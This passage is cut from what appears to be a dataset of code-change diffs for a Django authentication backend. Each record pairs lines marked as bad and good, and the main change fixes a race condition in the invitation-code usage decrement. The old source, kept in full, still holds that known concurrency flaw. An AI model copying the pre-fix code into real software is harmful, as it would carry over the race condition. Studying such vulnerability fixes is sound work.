email\")})","        token = super(CustomTokenObtainPairSerializer, cls).get_token(user)","        token['username'] = user.username","        token['email'] = user.email","        return token","class CustomTokenRefreshSerializer(TokenRefreshSerializer):","    \"\"\"","    Inherit from `TokenRefreshSerializer` and touch the database","    before re-issuing a new access token and ensure that the user","    exists and is active.","    \"\"\"","    error_msg = _('No active account found with the given credentials')","    def validate(self, attrs):","        try:","            token_payload = token_backend.decode(attrs['refresh'])","        except:","            raise serializers.ValidationError(","                {\"inavlid_token\": _('Invalid refresh token')})","        try:","            user = get_user_model().objects.get(pk=token_payload['user_id'])","        except get_user_model().DoesNotExist:","            raise serializers.ValidationError(","                {\"no_active_account\": self.error_msg})","        if not user.is_active:","            raise serializers.ValidationError(","                {\"no_active_account\": self.error_msg})","        return super().validate(attrs)"],"goodparts":["from django.utils.translation import get_language","from custom_auth.api.serializers.utils import check_user_with_email","from custom_auth.models import User","from django.contrib.auth.password_validation import validate_password","from custom_auth.tasks import send_email_code"]}],"source":"\nimport os from rest_framework import serializers from rest_framework_simplejwt.serializers import TokenObtainPairSerializer from custom_auth.models import User from custom_auth.api.serializers.utils import check_user_with_email from custom_auth.tasks import send_email_code from django.utils.timezone import now from django.conf import settings from django.utils.translation import gettext_lazy as _ from django.utils.translation import get_language from rest_framework_simplejwt.serializers import TokenRefreshSerializer from rest_framework_simplejwt.state import token_backend from django.contrib.auth import get_user_model class CustomTokenObtainPairSerializer(TokenObtainPairSerializer): @classmethod def get_token(cls, user): if not user.inv_code: raise serializers.ValidationError( {\"inv_code\": _(\"No invitation code stored\")}) if not user.verified: raise serializers.ValidationError( {\"verified\": _(\"Unverified email\")}) token=super(CustomTokenObtainPairSerializer, cls).get_token(user) token['username']=user.username token['email']=user.email return token class CustomTokenRefreshSerializer(TokenRefreshSerializer): \"\"\" Inherit from `TokenRefreshSerializer` and touch the database before re-issuing a new access token and ensure that the user exists and is active. \"\"\" error_msg=_('No active account found with the given credentials') def validate(self, attrs): try: token_payload=token_backend.decode(attrs['refresh']) except: raise serializers.ValidationError( {\"inavlid_token\": _('Invalid refresh token')}) try: user=get_user_model().objects.get(pk=token_payload['user_id']) except get_user_model().DoesNotExist: raise serializers.ValidationError( {\"no_active_account\": self.error_msg}) if not user.is_active: raise serializers.ValidationError( {\"no_active_account\": self.error_msg}) return super().validate(attrs) class CodeSerializer(serializers.Serializer): email=serializers.EmailField( required=True ) def validate_email(self, value): check_user_with_email(value) return value def validate(self, data): user=User.objects.get(email=data.get('email')) if user.date_code_sent: duration_s=(now() -user.date_code_sent).total_seconds() if duration_s < settings.EMAIL_CODE_THRESHOLD: raise serializers.ValidationError( {\"code\": _(\"Code has already been sent, wait{} seconds\") .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))}) return data def create(self, validated_data): email=validated_data['email'] code=os.urandom(3).hex() user=User.objects.get(email=email) user.code_sent=code user.date_code_sent=now() send_email_code.delay(code, email, get_language()) user.save() return{'email':email} class CodeVerificationSerializer(serializers.Serializer): email=serializers.EmailField( required=True ) code=serializers.CharField( required=True, min_length=6, max_length=6 ) def validate_email(self, value): check_user_with_email(value) return value def validate(self, data): user=User.objects.get(email=data.get('email')) if not user.date_code_sent: raise serializers.ValidationError({\"code\": _(\"No code sent\")}) if user.date_code_sent: duration_s=(now() -user.date_code_sent).total_seconds() if duration_s > settings.EMAIL_CODE_VALID: raise serializers.ValidationError( {\"code\": _(\"Code is no longer valid\")}) if user.code_sent !=data.get('code'): raise serializers.ValidationError({\"code\": _(\"Invalid code\")}) return data def create(self, validated_data): email=validated_data['email'] user=User.objects.get(email=email) user.verified=True user.save() return validated_data ","sourceWithComments":"import os\nfrom rest_framework import serializers\nfrom rest_framework_simplejwt.serializers import TokenObtainPairSerializer\nfrom custom_auth.models import User\nfrom custom_auth.api.serializers.utils import check_user_with_email\nfrom custom_auth.tasks import send_email_code\nfrom django.utils.timezone import now\nfrom django.conf import settings\nfrom django.utils.translation import gettext_lazy as _\nfrom django.utils.translation import get_language\nfrom rest_framework_simplejwt.serializers import TokenRefreshSerializer\nfrom rest_framework_simplejwt.state import token_backend\nfrom django.contrib.auth import get_user_model\n\n\nclass CustomTokenObtainPairSerializer(TokenObtainPairSerializer):\n\n    @classmethod\n    def get_token(cls, user):\n        if not user.inv_code:\n            raise serializers.ValidationError(\n                {\"inv_code\": _(\"No invitation code stored\")})\n        if not user.verified:\n            raise serializers.ValidationError(\n                {\"verified\": _(\"Unverified email\")})\n        token = super(CustomTokenObtainPairSerializer, cls).get_token(user)\n        # Custom keys added in PAYLOAD\n        token['username'] = user.username\n        token['email'] = user.email\n        return token\n\nclass CustomTokenRefreshSerializer(TokenRefreshSerializer):\n    \"\"\"\n    Inherit from `TokenRefreshSerializer` and touch the database\n    before re-issuing a new access token and ensure that the user\n    exists and is active.\n    \"\"\"\n\n    error_msg = _('No active account found with the given credentials')\n\n    def validate(self, attrs):\n        try:\n            token_payload = token_backend.decode(attrs['refresh'])\n        except:\n            raise serializers.ValidationError(\n                {\"inavlid_token\": _('Invalid refresh token')})\n        try:\n            user = get_user_model().objects.get(pk=token_payload['user_id'])\n        except get_user_model().DoesNotExist:\n            raise serializers.ValidationError(\n                {\"no_active_account\": self.error_msg})\n        if not user.is_active:\n            raise serializers.ValidationError(\n                {\"no_active_account\": self.error_msg})\n        return super().validate(attrs)\n\n\nclass CodeSerializer(serializers.Serializer):\n    email = serializers.EmailField(\n        required=True\n    )\n\n    def validate_email(self, value):\n        check_user_with_email(value)\n        return value\n    \n    def validate(self, data):\n        user = User.objects.get(email=data.get('email'))\n        if user.date_code_sent:\n            duration_s = (now() - user.date_code_sent).total_seconds()\n            if duration_s < settings.EMAIL_CODE_THRESHOLD :\n                raise serializers.ValidationError(\n                    {\"code\": _(\"Code has already been sent, wait {} seconds\")\n                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})\n        return data\n\n    def create(self, validated_data):\n        email = validated_data['email']\n        # Random 6 character string:\n        code = os.urandom(3).hex()\n        user = User.objects.get(email=email)    \n        user.code_sent = code\n        user.date_code_sent = now()\n        send_email_code.delay(code, email, get_language())\n        user.save()\n        return {'email':email}\n\n\nclass CodeVerificationSerializer(serializers.Serializer):\n    email = serializers.EmailField(\n        required=True\n    )\n    code = serializers.CharField(\n        required=True, \n        min_length=6, max_length=6\n    )\n\n    def validate_email(self, value):\n        check_user_with_email(value)\n        return value\n\n    def validate(self, data):\n        user = User.objects.get(email=data.get('email'))\n        if not user.date_code_sent:\n            raise serializers.ValidationError({\"code\": _(\"No code sent\")})\n        if user.date_code_sent:\n            duration_s = (now() - user.date_code_sent).total_seconds()\n            if duration_s > settings.EMAIL_CODE_VALID :\n                raise serializers.ValidationError(\n                    {\"code\": _(\"Code is no longer valid\")})\n        if user.code_sent != data.get('code') :\n            raise serializers.ValidationError({\"code\": _(\"Invalid code\")})\n        return data\n\n    def create(self, validated_data):\n        email = validated_data['email']\n        user = User.objects.get(email=email)\n        user.verified = True\n        user.save()\n        return validated_data\n"},"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py":{"changes":[{"diff":"\n from rest_framework.validators import UniqueValidator\n from django.contrib.auth.password_validation import validate_password\n from django.db import transaction\n-from django.utils.timezone import now\n-from django.conf import settings\n from django.utils.translation import gettext_lazy as _\n from django.utils.translation import check_for_language\n from django.core.exceptions import ValidationError\n \n \n-@transaction.atomic()\n-def decrease_inv_code_usage(code):\n-    \"\"\"\n-    Race condition at usage left update in an InvitationCode\n-    \"\"\"\n-    sid = transaction.savepoint()\n-    inv_code = code\n-    inv_code.usage_left -= 1\n-    if inv_code.usage_left <= 0: inv_code.is_active = False\n-    inv_code.save()\n-    transaction.savepoint_commit(sid)\n-\n def check_inv_code(code):\n     \"\"\"\n     Checks if an invitation code is created and valid\n","add":0,"remove":14,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py","badparts":["from django.utils.timezone import now","from django.conf import settings","@transaction.atomic()","def decrease_inv_code_usage(code):","    \"\"\"","    Race condition at usage left update in an InvitationCode","    \"\"\"","    sid = transaction.savepoint()","    inv_code = code","    inv_code.usage_left -= 1","    if inv_code.usage_left <= 0: inv_code.is_active = False","    inv_code.save()","    transaction.savepoint_commit(sid)"],"goodparts":[]},{"diff":"\n     Serializer for User creation (register)\n     \"\"\"\n     username = serializers.CharField(\n-        required=True, max_length=15,\n+        required=True,\n+        max_length=15,\n         validators=[UniqueValidator(queryset=User.objects.all())]\n     )\n     email = serializers.EmailField(\n","add":2,"remove":1,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py","badparts":["        required=True, max_length=15,"],"goodparts":["        required=True,","        max_length=15,"]},{"diff":"\n     )\n     inv_code = serializers.SlugRelatedField(\n         required=True, \n-        slug_field=\"code\", many=False,\n+        slug_field=\"code\",\n+        many=False,\n         queryset=InvitationCode.objects.all()\n     )\n     password = serializers.CharField(\n         required=True, \n         write_only=True,\n+        max_length=30,\n         validators=[validate_password]\n     )\n     password2 = serializers.CharField(\n","add":3,"remove":1,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py","badparts":["        slug_field=\"code\", many=False,"],"goodparts":["        slug_field=\"code\",","        many=False,","        max_length=30,"]},{"diff":"\n             language=language\n         )\n         user.set_password(validated_data['password'])\n-        decrease_inv_code_usage(inv_code)\n+        # Invitation code decrease, race condition\n+        inv_codes = InvitationCode.objects.select_for_update().filter(code=inv_code.code)\n+        with transaction.atomic():\n+            for inv_code in inv_codes:\n+                inv_code.usage_left = inv_code.usage_left - 1\n+                if inv_code.usage_left <= 0: inv_code.is_active = False\n+                inv_code.save()\n+        # Alternative:\n+        # inv_code.usage_left = F('usage_left') - 1\n         user.save()\n         return user\n \n","add":9,"remove":1,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py","badparts":["        decrease_inv_code_usage(inv_code)"],"goodparts":["        inv_codes = InvitationCode.objects.select_for_update().filter(code=inv_code.code)","        with transaction.atomic():","            for inv_code in inv_codes:","                inv_code.usage_left = inv_code.usage_left - 1","                if inv_code.usage_left <= 0: inv_code.is_active = False","                inv_code.save()"]},{"diff":"\n         ]\n         read_only_fields = [\n             'last_login'\n-        ]\n-\n-\n-class ChangePasswordSerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password change (needs old password)\n-    \"\"\"\n-    old_password = serializers.CharField(\n-        required=True,\n-        #validators=[validate_password]\n-    )\n-    new_password = serializers.CharField(\n-        required=True,\n-        validators=[validate_password]\n-    )\n-\n-class ResetPasswordStartSerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password reset (code creation)\n-    \"\"\"\n-    email = serializers.EmailField(required=True)\n-    \n-    def validate_email(self, email):\n-        try:\n-            User.objects.get(email=email)\n-        except:\n-            raise serializers.ValidationError(_(\"User not found\"))\n-        return email\n-\n-    def validate(self, data):\n-        user = User.objects.get(email=data['email'])\n-        if user.date_pass_reset:\n-            duration_s = (now() - user.date_pass_reset).total_seconds()\n-            if duration_s < settings.EMAIL_CODE_THRESHOLD :\n-                raise serializers.ValidationError(\n-                    {\"code\": _(\"Code has already been sent, wait {} seconds\")\n-                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})\n-        return data\n-\n-class ResetPasswordVerifySerializer(serializers.Serializer):\n-    \"\"\"\n-    Serializer for password reset (code verification)\n-    \"\"\"\n-    email = serializers.EmailField(required=True)\n-    code = serializers.CharField(\n-        required=True, \n-        min_length=6, max_length=6\n-    )\n-    new_password = serializers.CharField(\n-        required=True,\n-        validators=[validate_password]\n-    )\n-    \n-    def validate_email(self, email):\n-        try:\n-            User.objects.get(email=email)\n-        except:\n-            raise serializers.ValidationError(_(\"User not found\"))\n-        return email\n-\n-    def validate(self, data):\n-        user = User.objects.get(email=data[\"email\"])\n-        code = data[\"code\"]\n-        if not user.date_pass_reset:\n-            raise serializers.ValidationError({\"code\", _(\"No code sent\")})\n-        if user.date_pass_reset:\n-            duration_s = (now() - user.date_pass_reset).total_seconds()\n-            if duration_s > settings.EMAIL_CODE_VALID :\n-                raise serializers.ValidationError(\n-                    {\"code\": _(\"Code is no longer valid\")})\n-        if user.pass_reset != code :\n-            raise serializers.ValidationError(\n-                {\"code\": _(\"Invalid code\")})\n-        return data\n\\ No newline at end of file\n+        ]\n\\ No newlin","add":1,"remove":74,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/user_serializers.py","badparts":["        ]","class ChangePasswordSerializer(serializers.Serializer):","    \"\"\"","    Serializer for password change (needs old password)","    \"\"\"","    old_password = serializers.CharField(","        required=True,","    )","    new_password = serializers.CharField(","        required=True,","        validators=[validate_password]","    )","class ResetPasswordStartSerializer(serializers.Serializer):","    \"\"\"","    Serializer for password reset (code creation)","    \"\"\"","    email = serializers.EmailField(required=True)","    def validate_email(self, email):","        try:","            User.objects.get(email=email)","        except:","            raise serializers.ValidationError(_(\"User not found\"))","        return email","    def validate(self, data):","        user = User.objects.get(email=data['email'])","        if user.date_pass_reset:","            duration_s = (now() - user.date_pass_reset).total_seconds()","            if duration_s < settings.EMAIL_CODE_THRESHOLD :","                raise serializers.ValidationError(","                    {\"code\": _(\"Code has already been sent, wait {} seconds\")","                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})","        return data","class ResetPasswordVerifySerializer(serializers.Serializer):","    \"\"\"","    Serializer for password reset (code verification)","    \"\"\"","    email = serializers.EmailField(required=True)","    code = serializers.CharField(","        required=True, ","        min_length=6, max_length=6","    )","    new_password = serializers.CharField(","        required=True,","        validators=[validate_password]","    )","    def validate_email(self, email):","        try:","            User.objects.get(email=email)","        except:","            raise serializers.ValidationError(_(\"User not found\"))","        return email","    def validate(self, data):","        user = User.objects.get(email=data[\"email\"])","        code = data[\"code\"]","        if not user.date_pass_reset:","            raise serializers.ValidationError({\"code\", _(\"No code sent\")})","        if user.date_pass_reset:","            duration_s = (now() - user.date_pass_reset).total_seconds()","            if duration_s > settings.EMAIL_CODE_VALID :","                raise serializers.ValidationError(","                    {\"code\": _(\"Code is no longer valid\")})","        if user.pass_reset != code :","            raise serializers.ValidationError(","                {\"code\": _(\"Invalid code\")})","        return data"],"goodparts":["        ]"]}],"source":"\nfrom rest_framework import serializers from custom_auth.models import InvitationCode, User from rest_framework.validators import UniqueValidator from django.contrib.auth.password_validation import validate_password from django.db import transaction from django.utils.timezone import now from django.conf import settings from django.utils.translation import gettext_lazy as _ from django.utils.translation import check_for_language from django.core.exceptions import ValidationError @transaction.atomic() def decrease_inv_code_usage(code): \"\"\" Race condition at usage left update in an InvitationCode \"\"\" sid=transaction.savepoint() inv_code=code inv_code.usage_left -=1 if inv_code.usage_left <=0: inv_code.is_active=False inv_code.save() transaction.savepoint_commit(sid) def check_inv_code(code): \"\"\" Checks if an invitation code is created and valid \"\"\" inv_code=None try: inv_code=InvitationCode.objects.get(code=code) except: raise serializers.ValidationError(_(\"Invitation code not found\")) if not inv_code.is_active: raise serializers.ValidationError(_(\"Invalid invitation code\")) def check_username_pass12(username, email, password1, password2): \"\"\" Checks if 2 passwords are different, also that username and email are different to the passwords \"\"\" if password1 !=password2: raise serializers.ValidationError( {\"password\": _(\"Password fields do not match\")}) if username==password1 or email==password1: raise serializers.ValidationError( {\"password\": _(\"Password cannot match other profile data\")}) class UserCreationSerializer(serializers.ModelSerializer): \"\"\" Serializer for User creation(register) \"\"\" username=serializers.CharField( required=True, max_length=15, validators=[UniqueValidator(queryset=User.objects.all())] ) email=serializers.EmailField( required=True, validators=[UniqueValidator(queryset=User.objects.all())] ) inv_code=serializers.SlugRelatedField( required=True, slug_field=\"code\", many=False, queryset=InvitationCode.objects.all() ) password=serializers.CharField( required=True, write_only=True, validators=[validate_password] ) password2=serializers.CharField( required=True, write_only=True, ) class Meta: model=User fields=[ 'username', 'email', 'language', 'inv_code', 'pref_coin_type', 'password', 'password2' ] extra_kwargs={ \"pref_coin_type\":{\"required\": True}, \"language\":{\"required\": True} } def validate_language(self, value): if not check_for_language(value): raise serializers.ValidationError( _(\"Language not supported\")) return value def validate_inv_code(self, value): check_inv_code(value.code) return value def validate(self, attrs): check_username_pass12(attrs['username'], attrs['email'], attrs['password'], attrs['password2']) if attrs['username']==attrs['email']: raise ValidationError( {'common_fields': _(\"Username and email can not be the same\")}) return attrs def create(self, validated_data): inv_code=validated_data['inv_code'] pref_coin_type=validated_data['pref_coin_type'] language=validated_data['language'] user=User.objects.create( username=validated_data['username'], email=validated_data['email'], inv_code=inv_code, pref_coin_type=pref_coin_type, language=language ) user.set_password(validated_data['password']) decrease_inv_code_usage(inv_code) user.save() return user class UserRetrieveUpdateDestroySerializer(serializers.ModelSerializer): \"\"\" Serializer to get, update or delete user data \"\"\" username=serializers.CharField( max_length=15, validators=[UniqueValidator(queryset=User.objects.all())] ) email=serializers.EmailField( validators=[UniqueValidator(queryset=User.objects.all())] ) class Meta: model=User fields=[ 'username', 'email', 'receive_email_balance', 'balance', 'expected_annual_balance', 'expected_monthly_balance', 'receive_email_balance', 'language', 'pref_coin_type', 'image', 'last_login' ] read_only_fields=[ 'last_login' ] class ChangePasswordSerializer(serializers.Serializer): \"\"\" Serializer for password change(needs old password) \"\"\" old_password=serializers.CharField( required=True, ) new_password=serializers.CharField( required=True, validators=[validate_password] ) class ResetPasswordStartSerializer(serializers.Serializer): \"\"\" Serializer for password reset(code creation) \"\"\" email=serializers.EmailField(required=True) def validate_email(self, email): try: User.objects.get(email=email) except: raise serializers.ValidationError(_(\"User not found\")) return email def validate(self, data): user=User.objects.get(email=data['email']) if user.date_pass_reset: duration_s=(now() -user.date_pass_reset).total_seconds() if duration_s < settings.EMAIL_CODE_THRESHOLD: raise serializers.ValidationError( {\"code\": _(\"Code has already been sent, wait{} seconds\") .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))}) return data class ResetPasswordVerifySerializer(serializers.Serializer): \"\"\" Serializer for password reset(code verification) \"\"\" email=serializers.EmailField(required=True) code=serializers.CharField( required=True, min_length=6, max_length=6 ) new_password=serializers.CharField( required=True, validators=[validate_password] ) def validate_email(self, email): try: User.objects.get(email=email) except: raise serializers.ValidationError(_(\"User not found\")) return email def validate(self, data): user=User.objects.get(email=data[\"email\"]) code=data[\"code\"] if not user.date_pass_reset: raise serializers.ValidationError({\"code\", _(\"No code sent\")}) if user.date_pass_reset: duration_s=(now() -user.date_pass_reset).total_seconds() if duration_s > settings.EMAIL_CODE_VALID: raise serializers.ValidationError( {\"code\": _(\"Code is no longer valid\")}) if user.pass_reset !=code: raise serializers.ValidationError( {\"code\": _(\"Invalid code\")}) return data ","sourceWithComments":"from rest_framework import serializers\nfrom custom_auth.models import InvitationCode, User\nfrom rest_framework.validators import UniqueValidator\nfrom django.contrib.auth.password_validation import validate_password\nfrom django.db import transaction\nfrom django.utils.timezone import now\nfrom django.conf import settings\nfrom django.utils.translation import gettext_lazy as _\nfrom django.utils.translation import check_for_language\nfrom django.core.exceptions import ValidationError\n\n\n@transaction.atomic()\ndef decrease_inv_code_usage(code):\n    \"\"\"\n    Race condition at usage left update in an InvitationCode\n    \"\"\"\n    sid = transaction.savepoint()\n    inv_code = code\n    inv_code.usage_left -= 1\n    if inv_code.usage_left <= 0: inv_code.is_active = False\n    inv_code.save()\n    transaction.savepoint_commit(sid)\n\ndef check_inv_code(code):\n    \"\"\"\n    Checks if an invitation code is created and valid\n    \"\"\"\n    inv_code = None\n    try: inv_code = InvitationCode.objects.get(code=code)\n    except: raise serializers.ValidationError(_(\"Invitation code not found\"))\n    if not inv_code.is_active:\n        raise serializers.ValidationError(_(\"Invalid invitation code\"))\n\ndef check_username_pass12(username, email, password1, password2):\n    \"\"\"\n    Checks if 2 passwords are different, also that username and email \n    are different to the passwords\n    \"\"\"\n    if password1 != password2:\n        raise serializers.ValidationError(\n            {\"password\": _(\"Password fields do not match\")})\n    if username == password1 or email == password1:\n        raise serializers.ValidationError(\n            {\"password\": _(\"Password cannot match other profile data\")})\n\n\nclass UserCreationSerializer(serializers.ModelSerializer):\n    \"\"\"\n    Serializer for User creation (register)\n    \"\"\"\n    username = serializers.CharField(\n        required=True, max_length=15,\n        validators=[UniqueValidator(queryset=User.objects.all())]\n    )\n    email = serializers.EmailField(\n        required=True, \n        validators=[UniqueValidator(queryset=User.objects.all())]\n    )\n    inv_code = serializers.SlugRelatedField(\n        required=True, \n        slug_field=\"code\", many=False,\n        queryset=InvitationCode.objects.all()\n    )\n    password = serializers.CharField(\n        required=True, \n        write_only=True,\n        validators=[validate_password]\n    )\n    password2 = serializers.CharField(\n        required=True, \n        write_only=True,\n    )\n\n    class Meta:\n        model = User\n        fields = [\n            'username',\n            'email',\n            'language',\n            'inv_code',\n            'pref_coin_type',\n            'password',\n            'password2'\n        ]\n        extra_kwargs = {\n            \"pref_coin_type\": {\"required\": True},\n            \"language\": {\"required\": True}\n        }\n\n    def validate_language(self, value):\n        if not check_for_language(value):\n            raise serializers.ValidationError(\n                _(\"Language not supported\"))\n        return value\n\n    def validate_inv_code(self, value):\n        check_inv_code(value.code)\n        return value\n\n    def validate(self, attrs):\n        check_username_pass12(attrs['username'], attrs['email'], \n            attrs['password'], attrs['password2'])\n        if attrs['username'] == attrs['email']:\n            raise ValidationError(\n                {'common_fields': _(\"Username and email can not be the same\")})\n        return attrs\n\n    def create(self, validated_data):\n        inv_code = validated_data['inv_code']\n        pref_coin_type = validated_data['pref_coin_type']\n        language = validated_data['language']\n        user = User.objects.create(\n            username=validated_data['username'],\n            email=validated_data['email'],\n            inv_code=inv_code,\n            pref_coin_type=pref_coin_type,\n            language=language\n        )\n        user.set_password(validated_data['password'])\n        decrease_inv_code_usage(inv_code)\n        user.save()\n        return user\n\n\nclass UserRetrieveUpdateDestroySerializer(serializers.ModelSerializer):\n    \"\"\"\n    Serializer to get, update or delete user data\n    \"\"\"\n    username = serializers.CharField(\n        max_length=15,\n        validators=[UniqueValidator(queryset=User.objects.all())]\n    )\n    email = serializers.EmailField(\n        validators=[UniqueValidator(queryset=User.objects.all())]\n    )\n\n    class Meta:\n        model = User\n        fields = [\n            'username', \n            'email', \n            'receive_email_balance', \n            'balance',\n            'expected_annual_balance', \n            'expected_monthly_balance', \n            'receive_email_balance', \n            'language',\n            'pref_coin_type',\n            'image', \n            'last_login'\n        ]\n        read_only_fields = [\n            'last_login'\n        ]\n\n\nclass ChangePasswordSerializer(serializers.Serializer):\n    \"\"\"\n    Serializer for password change (needs old password)\n    \"\"\"\n    old_password = serializers.CharField(\n        required=True,\n        #validators=[validate_password]\n    )\n    new_password = serializers.CharField(\n        required=True,\n        validators=[validate_password]\n    )\n\nclass ResetPasswordStartSerializer(serializers.Serializer):\n    \"\"\"\n    Serializer for password reset (code creation)\n    \"\"\"\n    email = serializers.EmailField(required=True)\n    \n    def validate_email(self, email):\n        try:\n            User.objects.get(email=email)\n        except:\n            raise serializers.ValidationError(_(\"User not found\"))\n        return email\n\n    def validate(self, data):\n        user = User.objects.get(email=data['email'])\n        if user.date_pass_reset:\n            duration_s = (now() - user.date_pass_reset).total_seconds()\n            if duration_s < settings.EMAIL_CODE_THRESHOLD :\n                raise serializers.ValidationError(\n                    {\"code\": _(\"Code has already been sent, wait {} seconds\")\n                        .format(str(settings.EMAIL_CODE_THRESHOLD-duration_s))})\n        return data\n\nclass ResetPasswordVerifySerializer(serializers.Serializer):\n    \"\"\"\n    Serializer for password reset (code verification)\n    \"\"\"\n    email = serializers.EmailField(required=True)\n    code = serializers.CharField(\n        required=True, \n        min_length=6, max_length=6\n    )\n    new_password = serializers.CharField(\n        required=True,\n        validators=[validate_password]\n    )\n    \n    def validate_email(self, email):\n        try:\n            User.objects.get(email=email)\n        except:\n            raise serializers.ValidationError(_(\"User not found\"))\n        return email\n\n    def validate(self, data):\n        user = User.objects.get(email=data[\"email\"])\n        code = data[\"code\"]\n        if not user.date_pass_reset:\n            raise serializers.ValidationError({\"code\", _(\"No code sent\")})\n        if user.date_pass_reset:\n            duration_s = (now() - user.date_pass_reset).total_seconds()\n            if duration_s > settings.EMAIL_CODE_VALID :\n                raise serializers.ValidationError(\n                    {\"code\": _(\"Code is no longer valid\")})\n        if user.pass_reset != code :\n            raise serializers.ValidationError(\n                {\"code\": _(\"Invalid code\")})\n        return data"},"\/backend\/djangorest\/custom_auth\/api\/urls.py":{"changes":[{"diff":"\n from django.urls import path\n-from custom_auth.api.views import (\n-    ChangePasswordView,\n-    CodeVerificationView, \n-    CodeView, \n+from custom_auth.api.views.jwt_views import (\n     CustomTokenObtainPairView,\n     CustomTokenRefreshView,\n+)\n+from custom_auth.api.views.code_views import (\n+    ChangePasswordView,\n+    CodeVerificationView, \n+    CodeView,\n     ResetPasswordStartView,\n-    ResetPasswordVerifyView, \n+    ResetPasswordVerifyView,\n+)\n+from custom_auth.api.views.user_views import (\n     UserCreationView, \n     UserRetrieveUpd","add":9,"remove":5,"filename":"\/backend\/djangorest\/custom_auth\/api\/urls.py","badparts":["from custom_auth.api.views import (","    ChangePasswordView,","    CodeVerificationView, ","    CodeView, ","    ResetPasswordVerifyView, "],"goodparts":["from custom_auth.api.views.jwt_views import (",")","from custom_auth.api.views.code_views import (","    ChangePasswordView,","    CodeVerificationView, ","    CodeView,","    ResetPasswordVerifyView,",")","from custom_auth.api.views.user_views import ("]}],"source":"\nfrom django.urls import path from custom_auth.api.views import( ChangePasswordView, CodeVerificationView, CodeView, CustomTokenObtainPairView, CustomTokenRefreshView, ResetPasswordStartView, ResetPasswordVerifyView, UserCreationView, UserRetrieveUpdateDestroyView ) urlpatterns=[ path(\"jwt\", CustomTokenObtainPairView.as_view(), name=\"jwt_obtain_pair\"), path(\"jwt\/refresh\", CustomTokenRefreshView.as_view(), name=\"jwt_refresh\"), path(\"user\", UserCreationView.as_view(), name=\"user_post\"), path(\"email_code\/send\", CodeView.as_view(), name=\"email_code_send\"), path(\"email_code\/verify\", CodeVerificationView.as_view(), name=\"email_code_verify\"), path(\"user\/profile\", UserRetrieveUpdateDestroyView.as_view(), name='user_put_get_del'), path('user\/password\/change', ChangePasswordView.as_view(), name='change_password'), path('user\/password\/reset\/start', ResetPasswordStartView.as_view(), name='reset_password_start'), path('user\/password\/reset\/verify', ResetPasswordVerifyView.as_view(), name='reset_password_verify'), ] ","sourceWithComments":"from django.urls import path\nfrom custom_auth.api.views import (\n    ChangePasswordView,\n    CodeVerificationView, \n    CodeView, \n    CustomTokenObtainPairView,\n    CustomTokenRefreshView,\n    ResetPasswordStartView,\n    ResetPasswordVerifyView, \n    UserCreationView, \n    UserRetrieveUpdateDestroyView\n)\n\nurlpatterns = [\n    path(\"jwt\", CustomTokenObtainPairView.as_view(), name=\"jwt_obtain_pair\"),\n    path(\"jwt\/refresh\", CustomTokenRefreshView.as_view(), name=\"jwt_refresh\"),\n    path(\"user\", UserCreationView.as_view(), name=\"user_post\"),\n    path(\"email_code\/send\", CodeView.as_view(), name=\"email_code_send\"),\n    path(\"email_code\/verify\", CodeVerificationView.as_view(), name=\"email_code_verify\"),\n    path(\"user\/profile\", UserRetrieveUpdateDestroyView.as_view(), name='user_put_get_del'),\n    path('user\/password\/change', ChangePasswordView.as_view(), name='change_password'),\n    path('user\/password\/reset\/start', ResetPasswordStartView.as_view(), name='reset_password_start'),\n    path('user\/password\/reset\/verify', ResetPasswordVerifyView.as_view(), name='reset_password_verify'),\n]"},"\/backend\/djangorest\/custom_auth\/api\/views.py":{"changes":[{"diff":"\n import os\n-from coin.currency_converter_integration import convert_or_fetch\n from core.permissions import IsCurrentVerifiedUser\n from custom_auth.models import User\n-from custom_auth.api.serializers.jwt_code_serializers import (\n-    CodeSerializer, \n-    CodeVerificationSerializer, \n-    CustomTokenObtainPairSerializer, \n-    CustomTokenRefreshSerializer\n-)\n from rest_framework import generics, status, mixins\n-from rest_framework.parsers import FormParser, MultiPartParser, JSONParser\n+from rest_framework.parsers import JSONParser\n from rest_framework.permissions import AllowAny\n from rest_framework.response import Response\n-from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView\n-from custom_auth.api.serializers.user_serializers import (\n+from custom_auth.api.serializers.code_serializers import (\n+    CodeSerializer, \n+    CodeVerificationSerializer,\n     ChangePasswordSerializer,\n     ResetPasswordStartSerializer,\n     ResetPasswordVerifySerializer,\n-    UserCreationSerializer,\n-    UserRetrieveUpdateDestroySerializer\n )\n from custom_auth.tasks import send_password_code\n from django.utils.timezone import now\n from django.utils.translation import gettext_lazy as _\n from django.utils.translation import get_language\n \n-class UserCreationView(generics.CreateAPIView):\n-    queryset = User.objects.all()\n-    permission_classes = (AllowAny,)\n-    serializer_class = UserCreationSerializer\n-    parser_classes = (FormParser, JSONParser,)\n-\n-class UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):\n-    queryset = User.objects.all()\n-    permission_classes = (IsCurrentVerifiedUser,)\n-    serializer_class = UserRetrieveUpdateDestroySerializer\n-    parser_classes = (MultiPartParser, FormParser, JSONParser)\n-    \n-    def get_object(self, queryset=None):\n-        return self.request.user\n-    \n-    def perform_update(self, serializer):\n-        if 'email' in serializer.validated_data:\n-            serializer.validated_data['verified'] = False\n-        # The user balance should only be converted if\n-        # the same balance is provided in the request\n-        # and the pref_coin_type is changed, same for\n-        # expected_annual_balance and expected_monthly_balance\n-        if 'pref_coin_type' in serializer.validated_data:\n-            if 'balance' in serializer.validated_data:\n-                serializer.validated_data['balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['balance']\n-                )\n-            if 'expected_annual_balance' in serializer.validated_data:\n-                serializer.validated_data['expected_annual_balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    